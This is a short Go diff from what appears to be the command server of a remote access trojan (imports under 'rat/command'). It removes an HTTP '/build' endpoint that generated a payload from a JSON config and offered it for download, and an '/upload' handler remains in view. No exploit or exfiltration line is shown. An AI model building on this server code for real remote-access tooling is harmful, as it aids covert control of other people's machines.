@@ -7,7 +7,6 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
-	"rat/command/build"
 	"rat/command/utils"
 	"rat/common"
 	"strconv"
@@ -74,23 +73,6 @@ func main() {
 		if err != nil {
 			panic(err)
 		}
-	})
-	http.HandleFunc("/build", func(w http.ResponseWriter, r *http.Request) {
-		decoder := json.NewDecoder(r.Body)
-		var config build.Config
-		decoder.Decode(&config)
-		path, err := build.Build(&config, w)
-
-		if err != nil {
-			fmt.Println("build:", err.Error())
-			return
-		}
-
-		tempKey := addDownload(TempFile{
-			Path: path,
-		})
-
-		w.Write([]byte(tempKey))
 	})
 	http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
 		dir := r.PostFormValue("directory")
